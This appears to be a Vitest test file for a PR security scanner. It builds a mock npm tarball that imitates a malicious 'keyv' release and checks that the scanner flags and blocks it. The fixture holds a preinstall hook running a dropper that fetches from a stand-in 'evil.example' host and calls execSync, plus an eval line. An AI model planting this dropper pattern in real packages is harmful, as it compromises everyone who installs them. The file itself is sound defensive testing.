import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { gzipSync } from 'node:zlib'
import { scanPRFiles } from '../../../src/scanner/index'
import { analyzeDependencyTarball } from '../../../src/scanner/intel/deep-dependency'
import type { PRFile } from '../../../src/scanner/rules'

/**
 * Tarball scan (ChainDrop red team):
 * a consumer PR adds `keyv@6.0.0` and the registry serves a malicious
 * tarball (preinstall lifecycle script + setup.mjs dropper + obfuscated
 * payload). The scanner must download the real tarball, surface typed
 * findings, and fold them into the signed scan result.
 *
 * Network is mocked; SENTINEL_TARBALL_SCAN is force-enabled per test.
 */

function createTarBuffer(files: { name: string; content: string }[]): Buffer {
  const blocks: Buffer[] = []
  for (const file of files) {
    const nameBuf = Buffer.alloc(100)
    nameBuf.write(file.name.slice(0, 99), 'utf-8')
    const sizeBuf = Buffer.from(file.content.length.toString(8).padStart(11, '0') + ' ', 'utf-8')
    const modeBuf = Buffer.from('0000644 ', 'utf-8')
    const uidBuf = Buffer.from('0000000 ', 'utf-8')
    const gidBuf = Buffer.from('0000000 ', 'utf-8')
    const mtimeBuf = Buffer.from('00000000000 ', 'utf-8')
    const typeFlag = Buffer.from([48])
    const linknameBuf = Buffer.alloc(100)
    const magicBuf = Buffer.from('ustar\0', 'utf-8')
    const versionBuf = Buffer.from('00', 'utf-8')
    const unameBuf = Buffer.alloc(32)
    const gnameBuf = Buffer.alloc(32)
    const devmajorBuf = Buffer.from('0000000 ', 'utf-8')
    const devminorBuf = Buffer.from('0000000 ', 'utf-8')
    const prefixBuf = Buffer.alloc(155)
    const paddingBuf = Buffer.alloc(12)
    const header = Buffer.concat([
      nameBuf, modeBuf, uidBuf, gidBuf, sizeBuf, mtimeBuf,
      Buffer.alloc(8), typeFlag, linknameBuf, magicBuf, versionBuf,
      unameBuf, gnameBuf, devmajorBuf, devminorBuf, prefixBuf, paddingBuf,
    ])
    let chksum = 0
    for (let i = 0; i < 512; i++) {
      if (i >= 148 && i < 156) chksum += 32
      else chksum += header[i]
    }
    header.write(chksum.toString(8).padStart(6, '0'), 148, 'utf-8')
    header[154] = 0x20
    header[155] = 0x20
    blocks.push(header)
    const contentBuf = Buffer.from(file.content, 'utf-8')
    blocks.push(contentBuf)
    const padLen = 512 - (contentBuf.length % 512)
    if (padLen < 512) blocks.push(Buffer.alloc(padLen))
  }
  blocks.push(Buffer.alloc(512))
  blocks.push(Buffer.alloc(512))
  return Buffer.concat(blocks)
}

const maliciousKeyvTar = gzipSync(createTarBuffer([
  { name: 'package/package.json', content: JSON.stringify({ name: 'keyv', version: '6.0.0', scripts: { preinstall: 'node setup.mjs' } }) },
  { name: 'package/setup.mjs', content: [
    "import { execSync } from 'node:child_process';",
    "const res = await fetch('https://evil.example/payload');",
    "execSync('node math_init.js', { stdio: 'ignore' });",
  ].join('\n') },
  { name: 'package/Math_Symbol.js', content: 'eval("var marker = \\"x\\";");' },
]))

function makeFile(overrides: Partial<PRFile> & { filename: string }): PRFile {
  return { status: 'modified', additions: 10, deletions: 0, patch: '', contents_url: '', ...overrides }
}

/** fetch mock: tarball URLs always win over metadata, then longest key first. */
function mockRegistry(entries: Record<string, { json?: unknown; tarball?: Buffer }>): ReturnType<typeof vi.fn> {
  const byLen = (a: string, b: string) => b.length - a.length
  const tarballKeys = Object.keys(entries).filter(k => entries[k].tarball).sort(byLen)
  const jsonKeys = Object.keys(entries).filter(k => entries[k].json !== undefined).sort(byLen)
  return vi.fn(async (input: RequestInfo | URL) => {
    const url = String(input)
    for (const key of tarballKeys) {
      if (url.includes(key)) return new Response(entries[key].tarball!, { status: 200, headers: { 'content-type': 'application/octet-stream' } })
    }
    for (const key of jsonKeys) {
      if (url.includes(key)) return new Response(JSON.stringify(entries[key].json), { status: 200, headers: { 'content-type': 'application/json' } })
    }
    return new Response('not found', { status: 404 })
  })
}

let fetchMock: ReturnType<typeof vi.fn>

function setupRegistry(entries: Record<string, { json?: unknown; tarball?: Buffer }>): void {
  fetchMock = mockRegistry(entries)
  vi.stubGlobal('fetch', fetchMock)
}

function tarballCalls(): string[] {
  return fetchMock.mock.calls
    .map(c => String(c[0]))
    .filter(u => u.includes('.tgz'))
}

beforeEach(() => {
  vi.stubEnv('SENTINEL_TARBALL_SCAN', '1')
})

afterEach(() => {
  vi.unstubAllEnvs()
  vi.unstubAllGlobals()
})

describe('tarball scan: added dependency (ChainDrop)', () => {
  it('surfaces typed findings and BLOCKs the PR with a signed result', async () => {
    setupRegistry({
      'keyv/-/keyv-6.0.0.tgz': { tarball: maliciousKeyvTar },
      'registry.npmjs.org/keyv': { json: { versions: { '6.0.0': {} } } },
    })

    const result = await scanPRFiles([
      makeFile({ filename: 'package.json', patch: '+"keyv": "6.0.0"' }),
    ])

    expect(result.intel!.dependencyDelta).toBeDefined()
    expect(result.intel!.dependencyDelta!.risk).toBe('critical')
    expect(result.intel!.dependencyDelta!.toVersion).toBe('6.0.0')

    const lifecycle = result.findings.find(f => f.title.includes('Dangerous lifecycle script'))
    expect(lifecycle).toBeDefined()
    expect(lifecycle!.severity).toBe('critical')
    expect(lifecycle!.category).toBe('supply_chain')
    expect(lifecycle!.file).toContain('node_modules/keyv/package.json')

    const shell = result.findings.find(f => f.title.includes('Shell execution capability'))
    expect(shell).toBeDefined()

    const evalFinding = result.findings.find(f => f.title.includes('Unsafe eval'))
    expect(evalFinding).toBeDefined()
    expect(evalFinding!.severity).toBe('critical')

    const osCmd = result.findings.find(f => f.title.includes('OS command execution'))
    expect(osCmd).toBeDefined()

    expect(result.critical).toBeGreaterThanOrEqual(2)
    expect(result.riskScore).toBeGreaterThanOrEqual(30)
    expect(result.state).toBe('BLOCK')
    expect(result.attestation.signature).toBeTruthy()
  })

  it('resolves a range version through registry metadata', async () => {
    setupRegistry({
      'range-pkg/-/range-pkg-2.3.1.tgz': { tarball: gzipSync(createTarBuffer([{ name: 'package/index.js', content: 'const a = 1;' }])) },
      'registry.npmjs.org/range-pkg': { json: { versions: { '2.1.0': {}, '2.3.1': {} } } },
    })

    const scan = await analyzeDependencyTarball({ name: 'range-pkg', version: '^2.0.0', registry: 'npm' })
    expect(scan).toBeDefined()
    expect(scan!.resolvedVersion).toBe('2.3.1')
    expect(scan!.delta!.toVersion).toBe('2.3.1')
  })

  it('flags an added version that is not published (depublished attack signature)', async () => {
    setupRegistry({
      'registry.npmjs.org/ghost-pkg': { json: { versions: { '5.6.0': {} } } },
    })

    const result = await scanPRFiles([
      makeFile({ filename: 'package.json', patch: '+"ghost-pkg": "6.0.0"' }),
    ])

    const finding = result.findings.find(f => f.title.includes('not published'))
    expect(finding).toBeDefined()
    expect(finding!.severity).toBe('high')
    expect(finding!.category).toBe('supply_chain')
  })

  it('produces no tarball findings when the scan is disabled', async () => {
    vi.stubEnv('SENTINEL_TARBALL_SCAN', '0')
    setupRegistry({
      'keyv/-/keyv-6.0.0.tgz': { tarball: maliciousKeyvTar },
      'registry.npmjs.org/keyv': { json: { versions: { '6.0.0': {} } } },
    })

    const result = await scanPRFiles([
      makeFile({ filename: 'package.json', patch: '+"keyv": "6.0.0"' }),
    ])

    expect(result.findings.some(f => f.file && f.file.includes('node_modules/'))).toBe(false)
    expect(result.intel!.dependencyDelta).toBeUndefined()
  })

  it('stops scanning after the package budget instead of a fixed cap', async () => {
    vi.stubEnv('SENTINEL_TARBALL_BUDGET_PACKAGES', '1')
    setupRegistry({
      'budget-a/-/budget-a-1.0.0.tgz': { tarball: maliciousKeyvTar },
      'registry.npmjs.org/budget-a': { json: { versions: { '1.0.0': {} } } },
      'budget-b/-/budget-b-1.0.0.tgz': { tarball: maliciousKeyvTar },
      'registry.npmjs.org/budget-b': { json: { versions: { '1.0.0': {} } } },
    })

    const result = await scanPRFiles([
      makeFile({ filename: 'package.json', patch: '+"budget-a": "1.0.0"\n+"budget-b": "1.0.0"' }),
    ])

    // First dep consumed the single package slot; budget-b was never scanned.
    const tarballs = tarballCalls()
    expect(tarballs).toHaveLength(1)
    expect(tarballs[0]).toContain('budget-a-1.0.0.tgz')
    expect(result.intel!.dependencyDelta!.packageName).toBe('budget-a')
    expect(result.findings.some(f => f.description?.includes('budget-b'))).toBe(false)
  })

  it('stops scanning after the byte budget is exhausted', async () => {
    vi.stubEnv('SENTINEL_TARBALL_BUDGET_BYTES', '1')
    vi.stubEnv('SENTINEL_TARBALL_BUDGET_CONCURRENCY', '1') // sequential: bytes counted before the next start
    setupRegistry({
      'budget-a/-/budget-a-1.0.0.tgz': { tarball: maliciousKeyvTar },
      'registry.npmjs.org/budget-a': { json: { versions: { '1.0.0': {} } } },
      'budget-b/-/budget-b-1.0.0.tgz': { tarball: maliciousKeyvTar },
      'registry.npmjs.org/budget-b': { json: { versions: { '1.0.0': {} } } },
    })

    const result = await scanPRFiles([
      makeFile({ filename: 'package.json', patch: '+"budget-a": "1.0.0"\n+"budget-b": "1.0.0"' }),
    ])

    // Tiny byte budget: budget-a was scanned (bytes accounted after download),
    // then the budget was spent and budget-b was never scanned.
    const tarballs = tarballCalls()
    expect(tarballs).toHaveLength(1)
    expect(tarballs[0]).toContain('budget-a-1.0.0.tgz')
    expect(result.intel!.dependencyDelta!.packageName).toBe('budget-a')
    expect(result.findings.some(f => f.description?.includes('budget-b'))).toBe(false)
  })

  it('scans more dependencies when the budget allows (no fixed cap)', async () => {
    vi.stubEnv('SENTINEL_TARBALL_BUDGET_PACKAGES', '3')
    setupRegistry({
      'budget-a/-/budget-a-1.0.0.tgz': { tarball: maliciousKeyvTar },
      'registry.npmjs.org/budget-a': { json: { versions: { '1.0.0': {} } } },
      'budget-b/-/budget-b-1.0.0.tgz': { tarball: gzipSync(createTarBuffer([{ name: 'package/index.js', content: 'const ok = 1;' }])) },
      'registry.npmjs.org/budget-b': { json: { versions: { '1.0.0': {} } } },
      'budget-c/-/budget-c-1.0.0.tgz': { tarball: gzipSync(createTarBuffer([{ name: 'package/index.js', content: 'const ok = 2;' }])) },
      'registry.npmjs.org/budget-c': { json: { versions: { '1.0.0': {} } } },
    })

    const result = await scanPRFiles([
      makeFile({ filename: 'package.json', patch: '+"budget-a": "1.0.0"\n+"budget-b": "1.0.0"\n+"budget-c": "1.0.0"' }),
    ])

    const tarballs = tarballCalls()
    expect(tarballs).toHaveLength(3)
    expect(tarballs.some(u => u.includes('budget-a-1.0.0.tgz'))).toBe(true)
    expect(tarballs.some(u => u.includes('budget-b-1.0.0.tgz'))).toBe(true)
    expect(tarballs.some(u => u.includes('budget-c-1.0.0.tgz'))).toBe(true)
    expect(result.intel!.dependencyDelta!.packageName).toBe('budget-a')
  })
})

describe('tarball scan: updated dependency diff', () => {
  it('still diffs two published versions for updated deps', async () => {
    setupRegistry({
      'dep-old/-/dep-old-5.2.3.tgz': { tarball: gzipSync(createTarBuffer([{ name: 'package/index.js', content: 'const a = 1;' }])) },
      'dep-old/-/dep-old-6.0.0.tgz': { tarball: gzipSync(createTarBuffer([{ name: 'package/index.js', content: 'const a = 2;' }])) },
      'registry.npmjs.org/dep-old': { json: { versions: { '5.2.3': {}, '6.0.0': {} } } },
    })

    const result = await scanPRFiles([
      makeFile({ filename: 'package.json', patch: '+"dep-old": "6.0.0"\n-"dep-old": "5.2.3"' }),
    ])

    expect(result.intel!.dependencyDelta).toBeDefined()
    expect(result.intel!.dependencyDelta!.fromVersion).toBe('5.2.3')
    expect(result.intel!.dependencyDelta!.toVersion).toBe('6.0.0')
    expect(result.intel!.dependencies!.updated).toHaveLength(1)
  })
})
